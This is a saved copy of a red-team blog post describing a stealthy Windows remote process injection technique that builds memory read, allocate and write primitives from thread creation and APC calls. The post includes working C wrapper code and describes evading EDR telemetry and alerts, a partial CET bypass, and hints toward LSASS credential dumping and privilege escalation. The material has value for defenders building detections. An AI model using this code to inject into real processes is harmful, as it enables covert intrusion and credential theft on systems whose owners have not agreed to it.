@@ -1,0 +1,214 @@
+# https://trickster0.github.io/posts/Primitive-Injection/
+
+<!DOCTYPE html><html lang="en"><body data-spy="scroll" data-target="#toc"><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="https://trickster0.github.io/"> Home </a> </span> <span>Primitive Injection - Breaking the Status Quo</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel">Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip="">Primitive Injection - Breaking the Status Quo</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> trickster0 </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="" data-original-title="Fri, Jun 6, 2025, 12:00 AM +0800">Jun 6 <i class="unloaded">2025-06-06T00:00:00+08:00</i></span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="" data-original-title="Sat, Jun 21, 2025, 1:43 PM +0300">Jun 21 <i class="unloaded">2025-06-21T18:43:50+08:00</i></span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="" data-original-title="2251 words">12 min read</span></div></div><div class="post-content"><p>It has been a while, this is my research on trying to change the IOCs of a common remote process injection flow and the end result.<br> I presented this in RedTreat in 2024 and I thought it was about time I publish it.<br> As you most likely know, in order to perform remote process injection a few things need to happen:<br> 1) Open the remote process with PROCESS_ALL_ACCESS or PROCESS_VM_OPERATION, PROCESS_VM_WRITE, PROCESS_CREATE_THREAD to obtain handle to the process<br> 2) Remote allocate enough memory to fit your shellcode<br> 3) Make that memory executable<br> 4) Create a new thread that will execute that shellcode memory address</p><p>Obviously there are multiple other variations but they all are quite similar. I thought I would give a challenge to myself and achieve the above or, like I mentioned, other variations by only opening the remote process with PROCESS_CREATE_THREAD and PROCESS_QUERY_LIMITED_INFORMATION. If you have not understood yet where this is going, basically I wanted to create primitives or remotely allocating, reading and writing memory remotely by just creating threads.</p><p>There has been some previous research on this by Austin Hudson (He posted something on <del>twitter</del> X) and <a href="https://www.x86matthew.com/view_post?id=read_write_proc_memory">x86matthew</a> but I wanted something better.<br> I am sure most of you would think, let’s try to find a rop gadget and do this; so did I! However, it was not that easy since in order to avoid PROCESS_VM_OPERATION to patch CFG on processes was included in my challenge.<br> This means that I would have to find a rop gadget that would not be impacted by CFG and that it will be good for the job. Also I wanted to limit my rop gadgets to ntdll for personal reasons.<br> Remote allocation is easy enough if you do not care about its permissions in memory as long as it is writable; just open the remote process with PROCESS_QUERY_LIMITED_INFORMATION and PROCESS_CREATE_THREAD, and create a new thread by passing the malloc function with the size you want the allocation to have.</p><p>Malloc Definition:</p><div class="language-plaintext highlighter-rouge"><div class="code-header" data-lang="plaintext"><button data-original-title="" title=""><i class="fa-fw far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>void *malloc(
+   size_t size
+);
+</pre></td></tr></tbody></table></code></div></div><p>New Thread:</p><div class="language-plaintext highlighter-rouge"><div class="code-header" data-lang="plaintext"><button data-original-title="" title=""><i class="fa-fw far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>NtCreateThreadEx(&amp;hThread, THREAD_ALL_ACCESS, NULL, hProc, malloc, (PVOID)sizeofShellcode, FALSE, NULL, NULL, NULL, NULL);
+</pre></td></tr></tbody></table></code></div></div><p>NtCreateThreadEx or CreateRemoteThread can take a function to call as an argument and then pass it one argument to that function, which should suffice for this.</p><p>If you are not aware, malloc function internally will automatically pick a place in memory according to the process’ heap base address. Until this point everything is moving in the right direction, but there is a problem that needs to be tackled. How do I find the address that the allocation happened?<br> Thankfully there is an API called GetExitCodeThread that allows to receive the EAX register, which means the return value from the thread, which in this case provides the memory allocation. HOWEVER, it only returns EAX, 4 bytes, but this is a technique for x64 bit Windows that requires to have 6 bytes instead (since heap alloc is in user mode).</p><p>GetExitCodeThread Definition:</p><div class="language-plaintext highlighter-rouge"><div class="code-header" data-lang="plaintext"><button data-original-title="" title=""><i class="fa-fw far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre>BOOL GetExitCodeThread(
+  HANDLE  hThread,
+  LPDWORD lpExitCode
+);
+</pre></td></tr></tbody></table></code></div></div><p>This was a blocking point on finding the remote memory address, so I tried to tackle the Read primitive in case it could help me approach this difficulty and somehow finding the address.<br> Like I mentioned earlier, avoiding CFG was tough, so it took me a lot of time to go through potential avenues for finding rop gadgets to achieve a read process memory operation but after a while I found something better than a rop gadget; I found an existing function called RtlQueryDepthSList.</p><p>RtlQueryDepthSList Definition (This is my definition, not MSDN’s):</p><div class="language-plaintext highlighter-rouge"><div class="code-header" data-lang="plaintext"><button data-original-title="" title=""><i class="fa-fw far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>DWORD RtlQueryDepthSList(
+  PVOID addressToRead
+);
+</pre></td></tr></tbody></table></code></div></div><p>RtlQueryDepthSList Assembly:</p><div class="language-plaintext highlighter-rouge"><div class="code-header" data-lang="plaintext"><button data-original-title="" title=""><i class="fa-fw far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>mov eax, word ptr [rcx]
+ret;
+</pre></td></tr></tbody></table></code></div></div><p>RtlQueryDepthSList takes one argument of the memory you want to read, but only read 2 bytes and then returns 4 back. Since RtlQueryDepthSList can get us 2 bytes at a time, it is not the most optimal situation, ideally we would need something that would read a DWORD to create less threads and read remote memory. By looping and iterating 2 bytes at the memory we want to read though we can successfully achieve what we need.</p><p>Wrapper created for read primitive:</p><div class="language-plaintext highlighter-rouge"><div class="code-header" data-lang="plaintext"><button data-original-title="" title=""><i class="fa-fw far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+</pre></td><td class="rouge-code"><pre>unsigned char* ReadRemoteMemory(HANDLE hProc, LPVOID addrOf, int sizeofVal) 
+{
+	unsigned char* readBytes = (unsigned char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 8);
+	DWORD dwDataLength = sizeofVal;
+	for (DWORD i = 0; i &lt; dwDataLength; i = i + 2)
+	{
+		HANDLE hThread = NULL;
+		NtCreateThreadEx(&amp;hThread, GENERIC_EXECUTE, NULL, hProc, RtlQueryDepthSList, (ULONG_PTR*)((BYTE*)addrOf + i), FALSE, NULL, NULL, NULL, NULL);
+		DWORD ExitCode = 0;
+		NtWaitForSingleObject(hThread, FALSE, NULL);
+		GetExitCodeThread(hThread, &amp;ExitCode);
+		if (dwDataLength - i == 1)
+		{
+			CustomCopy((char*)readBytes + i, (const void*)&amp;ExitCode, 1);
+		}
+		else
+		{
+			CustomCopy((char*)readBytes + i, (const void*)&amp;ExitCode, 2);
+		}
+	}
+	return readBytes;
+}
+
+</pre></td></tr></tbody></table></code></div></div><p>The wrapper performs now pretty similarly to ReadProcessMemory, it takes the handle of the process, the memory we want to read, how many bytes we want to read and then it returns back the allocated memory. Next step was stitching the Read primitive with the Allocation primitive to obtain the remotely allocated memory address.</p><p>Turns out there is a workaround and this is the reason PROCESS_QUERY_LIMITED_INFORMATION is required (or does it?). By calling NtQueryInformationProcess and asking for ProcessBasicInformation, it is possible to receive the remote process’ PEB address, which also contains the process base heap address.<br> Since malloc allocates in process’ base heap, my allocation should be based on that base heap, hence since I could obtain the last 4 bytes of the allocation address, I could perform an AND mask operation between them.<br> Steps for obtaining the remotely allocated address:<br> 1) Call NtQueryInformationProcess with ProcessBasicInformation to obtain the PEB address<br> 2) Calling the Read primitive on the previously obtained PEB address + 0x30 offset, and reading 8 bytes to get the heap base address off the GetExitCodeThread<br> 3) Perform the AND mask operation to calculate the actual allocation address:</p><div class="language-plaintext highlighter-rouge"><div class="code-header" data-lang="plaintext"><button data-original-title="" title=""><i class="fa-fw far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>DWORD64 heapAllocation = (0xFFFFFFFF00000000 &amp; (INT64)HeapAddr) + ExitCode;
+</pre></td></tr></tbody></table></code></div></div><p>Wrapper created for this primitive for remote allocation:</p><div class="language-plaintext highlighter-rouge"><div class="code-header" data-lang="plaintext"><button data-original-title="" title=""><i class="fa-fw far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td><td class="rouge-code"><pre>LPVOID RemoteAllocation(HANDLE hProc, LPVOID HeapAddr, int sizeofVal) 
+{
+	HANDLE hThread = NULL;
+	NtCreateThreadEx(&amp;hThread, THREAD_ALL_ACCESS, NULL, hProc, malloc, (PVOID)sizeofVal, FALSE, NULL, NULL, NULL, NULL);
+	NtWaitForSingleObject(hThread, FALSE, NULL);
+	DWORD ExitCode = 0;
+	GetExitCodeThread(hThread, &amp;ExitCode);
+	DWORD64 heapAllocation = (0xFFFFFFFF00000000 &amp; (INT64)HeapAddr) + ExitCode;
+	return (LPVOID)heapAllocation;
+}
+</pre></td></tr></tbody></table></code></div></div><p>Right now, it is possible to read and allocate remotely; what is left is writing, which unfortunately by the approach so far and using NtCreateThreadEx will not work since it can only allow us to pass one argument to whatever it is we are calling. However in a WriteProcessMemory situation, it would require to pass a memory to write the bytes and the bytes to write, so at least 2 arguments. NtQueueApcThread allows for up to 3 arguments, so I had to find a rop gadget to achieve that in the most optimal way.<br> Both of the public approaches used RtlFillMemory which fits with NtQueueApcThread but it would literally create 1 APC request per byte that you want to write, hence an average shellcode of 270kb would create 270.000 APCs. Crazy amount, which I actually tried against MDE and got an alert for StackBombing.</p><p><a href="https://github.com/trickster0/trickster0.github.io/raw/master/assets/img/favicons/stackbombing.png" class="img-link"><img data-proofer-ignore="" data-src="https://github.com/trickster0/trickster0.github.io/raw/master/assets/img/favicons/stackbombing.png" alt="" src="https://github.com/trickster0/trickster0.github.io/raw/master/assets/img/favicons/stackbombing.png" data-loaded="true"></a></p><p>After looking for so many hours into ntdll assembly instructions for something that would fit the purpose of Write primitive, I finally found, guess what, ANOTHER FUNCTION, RtlInitializeBitMapEx.</p><p>RtlInitializeBitMapEx Definition (Again, this is my definition, not MSDN’s):</p><div class="language-plaintext highlighter-rouge"><div class="code-header" data-lang="plaintext"><button data-original-title="" title=""><i class="fa-fw far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre>BOOL RtlInitializeBitMapEx(
+  PVOID  addressMemoryToWrite,
+  PVOID  8bytesToWriteAfter8Bytes,
+  PVOID  8bytesToWrite
+);
+</pre></td></tr></tbody></table></code></div></div><p>RtlInitializeBitMapEx Assembly:</p><div class="language-plaintext highlighter-rouge"><div class="code-header" data-lang="plaintext"><button data-original-title="" title=""><i class="fa-fw far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>mov [rcx], r8
+mov [rcx+8], rdx
+ret;
+</pre></td></tr></tbody></table></code></div></div><p>Realistically speaking this is a godsend function/rop gadget (fop gadget?), since it allows not only to write 8 bytes at a time but 16! This is 16 times better than RtlFillMemory, since this function takes as a first argument the memory where we want to allocate the bytes to; as a second argument, it takes the 8 bytes after the first 8 bytes we want to write into the allocated address plus 8 bytes; as a third argument it takes the first 8 bytes we want to write into the allocated address, so performing a NtQueueApcThread loop and iterating by 16 bytes at a time allows for writing in the remote process successfully. However, in order to optimize the process in case the bytes are more or less than 8 or 16 or divisible by 8, I had to use RtlFillBuffer as well.</p><p>Wrapper created for this primitive for remote allocation:</p><div class="language-plaintext highlighter-rouge"><div class="code-header" data-lang="plaintext"><button data-original-title="" title=""><i class="fa-fw far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+</pre></td><td class="rouge-code"><pre>void WriteRemoteMemory(HANDLE hProc, LPVOID heapAllocation, int sizeofVal, unsigned char* buffer, HMODULE module) 
+{
+	LPVOID RtlFillMemory = GetProcAddress(module, "RtlFillMemory");
+	LPVOID RtlExitUserThread = GetProcAddress(module, "RtlExitUserThread");
+	LPVOID RtlInitializeBitMapEx = GetProcAddress(module, "RtlInitializeBitMapEx");
+
+	HANDLE hThread2 = NULL;
+	NtCreateThreadEx(&amp;hThread2, THREAD_ALL_ACCESS, NULL, hProc, RtlExitUserThread, (PVOID)0x00000000, TRUE, NULL, NULL, NULL, NULL);
+	int alignmentCheck = sizeofVal % 16;
+	int offsetMax = sizeofVal - alignmentCheck;
+	int firCounter = 0;
+	int eightCounter = 0;
+	int secCounter = 0;
+	int mod = 0;
+
+	if (sizeofVal &gt;= 16) {
+		for (firCounter = 0; firCounter &lt; offsetMax -1; firCounter = firCounter + 16) {
+			char* heapWriter = (char*)heapAllocation + firCounter;
+			NtQueueApcThread(hThread2, (PKNORMAL_ROUTINE)RtlInitializeBitMapEx, (PVOID)heapWriter, (PVOID)*(ULONG_PTR*)((char*)buffer + firCounter + 8), (PVOID)*(ULONG_PTR*)((char*)buffer + firCounter));
+		}
+	}
+
+	if (alignmentCheck &gt;= 8) {	
+		for (eightCounter = firCounter; (eightCounter + 8) &lt; (firCounter + alignmentCheck -1); eightCounter = eightCounter + 8) {
+			char* heapWriter = (char*)heapAllocation + eightCounter;
+			NtQueueApcThread(hThread2, (PKNORMAL_ROUTINE)RtlInitializeBitMapEx, (PVOID)heapWriter, NULL, (PVOID)*(ULONG_PTR*)((char*)buffer + eightCounter));
+		}
+		alignmentCheck -= 8;
+	}
+
+	if (alignmentCheck != 0 &amp;&amp; alignmentCheck &lt; 8) {
+
+		if ((firCounter != 0 &amp;&amp; eightCounter != 0) || (firCounter != 0 &amp;&amp; eightCounter != 0)){
+			secCounter = eightCounter;
+			mod = eightCounter;
+		}
+		else if (firCounter != 0 &amp;&amp; eightCounter == 0){
+			secCounter = firCounter;
+			mod = firCounter;
+		}
+
+		for (; secCounter &lt; (mod + alignmentCheck); secCounter++) {
+			char* heapWriter = (char*)heapAllocation + secCounter;
+			NtQueueApcThread(hThread2, (PKNORMAL_ROUTINE)RtlFillMemory, (PVOID)heapWriter, (PVOID)1, (PVOID)buffer[secCounter]);
+		}
+	}
+
+	NtResumeThread(hThread2, NULL);
+	NtWaitForSingleObject(hThread2, FALSE, NULL);
+}
+</pre></td></tr></tbody></table></code></div></div><p>As a fun fact I might as well mention that the 270.000 APCs turned to 16.875 APCs which is an insane progress and no stackbombing alert anymore.<br> The Write primitive wrapper takes as a first argument the handle of the remote process; as a second argument the remotely allocated memory; as a third argument how many bytes we want to write; as a fourth argument the buffer that contains the bytes we want to write in the remote process; as a fifth argument the ntdll’s base address.</p><h2 id="achievements">Achievements</h2><p>Right now it is possible to read, write and allocate in a remote process with just PROCESS_CREATE_THREAD, PROCESS_QUERY_LIMITED_INFORMATION without requiring to patch CFG. It is really easy to perform an injection which I am not gonna go through here but in the proof of concept code on my <a href="https://github.com/trickster0/PrimitiveInjection">github link</a>, you will find a BOF example. I will be cheating there a little bit by using PROCESS_VM_OPERATION to patch CFG in the remote process in order to call NtContinue, since Foliage’s method of calling APIs in the remote process is very convenient and also write primitive solves the problem with passing more than four arguments with the CONTEXTS, like you will notice in my POC. FYI I leave this for the reader; it is possible to perform a very OPSEC injection with limited IOCs with just PROCESS_CREATE_THREAD permissions.</p><p>Aside from the above, it is worth mentioning that we completely remove the telemetry of ETWTI for ReadProcessMemory and WriteProcessMemory. Also we create threads and call APCs with addresses that are fully backed in memory to files on disk.</p><h2 id="caveats">Caveats</h2><p>The only caveat I want to mention is that the read primitive, even though it works great for reading small size buffers, trying to abuse this to read many chunks will make the system unusable and almost frozen, since I tried to perform LSASS dumping with it and the amount of threads being created is just insane. It was working but after a bit it just froze, so realistically you cannot use it for LSASS dumping BUT you might be able to find a faster method to do it (wink wink).</p><h2 id="bonus">Bonus</h2><p>I hope you took note of the fact that I do not call ROP gadgets, they are literally functions, which has some positive side effects. Aside from the fact that these primitives are also useful in exploit developers, they also offer a partial CET bypass. Even though I am not an expert on the subject of CET, It offers a couple of protection mechanisms; Shadow stack and Indirect Branch Tracking (IBT).<br> IBT is a code integrity control flow mechanism that can easily kill rop gadgets but since in my case the primitives call literal function, it is an automatic bypass.</p><p>Another bonus which is an extreme case but could happen is, if you would ever find an elevated process that allows for a low/medium context process to open a handle with just PROCESS_CREATE_THREAD, you can perform a privilege escalation.</p><h2 id="final-notes">Final Notes</h2><p>Obviously these wrappers can be used for the local process as well but it kind of loses the point, since it is easier to write a custom memcpy to read/write bytes. Lastly, this is more about the primitives and the wrappers than the actual injection that is the result of them.</p></div><div class="post-tail-wrapper text-muted"><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Primitive%20Injection%20-%20Breaking%20the%20Status%20Quo%20-%20trickster0%27s%20Nest&amp;url=https://trickster0.github.io/posts/Primitive-Injection/" data-toggle="tooltip" data-placement="top" title="" target="_blank" rel="noopener" aria-label="Twitter" data-original-title="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Primitive%20Injection%20-%20Breaking%20the%20Status%20Quo%20-%20trickster0%27s%20Nest&amp;u=https://trickster0.github.io/posts/Primitive-Injection/" data-toggle="tooltip" data-placement="top" title="" target="_blank" rel="noopener" aria-label="Facebook" data-original-title="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Primitive%20Injection%20-%20Breaking%20the%20Status%20Quo%20-%20trickster0%27s%20Nest&amp;url=https://trickster0.github.io/posts/Primitive-Injection/" data-toggle="tooltip" data-placement="top" title="" target="_blank" rel="noopener" aria-label="Telegram" data-original-title="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="" data-original-title="Copy link"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="https://trickster0.github.io/posts/Primitive-Injection/">Primitive Injection - Breaking the Status Quo</a></li><li><a href="https://trickster0.github.io/posts/Custom-ReadMemory-API/">Custom ReadMemory API</a></li><li><a href="https://trickster0.github.io/posts/Halo's-Gate-Evolves-to-Tartarus-Gate/">Halo's Gate Evolves -&gt; Tartarus' Gate</a></li><li><a href="https://trickster0.github.io/posts/Solving-the-BFS-EkoParty/">Solving the BFS Ekoparty 2019 Exploitation Challenge</a></li><li><a href="https://trickster0.github.io/posts/earlybird-apc-queue-injection-with-processstatechange-a-twist/">EarlyBird APC Queue Injection With a ProcessStateChange Twist</a></li></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="https://trickster0.github.io/tags/hacking/">hacking</a> <a class="post-tag" href="https://trickster0.github.io/tags/vulnhub/">vulnhub</a> <a class="post-tag" href="https://trickster0.github.io/tags/vm/">vm</a> <a class="post-tag" href="https://trickster0.github.io/tags/challenge/">challenge</a> <a class="post-tag" href="https://trickster0.github.io/tags/challenges/">challenges</a> <a class="post-tag" href="https://trickster0.github.io/tags/hack/">hack</a> <a class="post-tag" href="https://trickster0.github.io/tags/0/">%0</a> <a class="post-tag" href="https://trickster0.github.io/tags/asa/">asa</a> <a class="post-tag" href="https://trickster0.github.io/tags/certificate/">certificate</a> <a class="post-tag" href="https://trickster0.github.io/tags/cisco/">cisco</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip="">Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="https://trickster0.github.io/posts/Custom-ReadMemory-API/"><div class="card-body"> <span class="timeago small">Feb 13, 2022 <i class="unloaded">2022-02-13T00:00:00+08:00</i></span><h3 class="pt-0 mt-1 mb-3" data-toc-skip="">Custom ReadMemory API</h3><div class="text-muted small"><p> After the great job and inspiration by x86matthew and his blogpost I decided to play with it as well for x64 bit. The NTAPI function in this method is RtlFirstEntrySList from ntdll.dll. Its definit...</p></div></div></a></div><div class="card"> <a href="https://trickster0.github.io/posts/Halo's-Gate-Evolves-to-Tartarus-Gate/"><div class="card-body"> <span class="timeago small">Nov 27, 2021 <i class="unloaded">2021-11-27T00:00:00+08:00</i></span><h3 class="pt-0 mt-1 mb-3" data-toc-skip="">Halo's Gate Evolves -&gt; Tartarus' Gate</h3><div class="text-muted small"><p> A while ago in my twitter, I have mentioned what a huge fan I am of Hell’s Gate and Halo’s Gate. Hell’s Gate originally is a very creative way to fetch the syscall numbers by parsing the InMemoryOr...</p></div></div></a></div><div class="card"> <a href="https://trickster0.github.io/posts/Solving-the-BFS-EkoParty/"><div class="card-body"> <span class="timeago small">Nov 5, 2021 <i class="unloaded">2021-11-05T00:00:00+08:00</i></span><h3 class="pt-0 mt-1 mb-3" data-toc-skip="">Solving the BFS Ekoparty 2019 Exploitation Challenge</h3><div class="text-muted small"><p> This is a quick write up about how one of our team members, Thanasis, solved the challenge for EkoParty 2019. This was a fun challenge and thanks to Lukas and Nico from Blue Frost Security for maki...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="https://trickster0.github.io/posts/Custom-ReadMemory-API/" class="btn btn-outline-primary" prompt="Older"><p>Custom ReadMemory API</p></a> <span class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></span></div></div></div></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="https://trickster0.github.io/tags/hacking/">hacking</a> <a class="post-tag" href="https://trickster0.github.io/tags/vulnhub/">vulnhub</a> <a class="post-tag" href="https://trickster0.github.io/tags/vm/">vm</a> <a class="post-tag" href="https://trickster0.github.io/tags/challenge/">challenge</a> <a class="post-tag" href="https://trickster0.github.io/tags/challenges/">challenges</a> <a class="post-tag" href="https://trickster0.github.io/tags/hack/">hack</a> <a class="post-tag" href="https://trickster0.github.io/tags/0/">%0</a> <a class="post-tag" href="https://trickster0.github.io/tags/asa/">asa</a> <a class="post-tag" href="https://trickster0.github.io/tags/certificate/">certificate</a> <a class="post-tag" href="https://trickster0.github.io/tags/cisco/">cisco</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="https://trickster0.github.io/posts/Primitive-Injection/#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a>        
+</body></html>
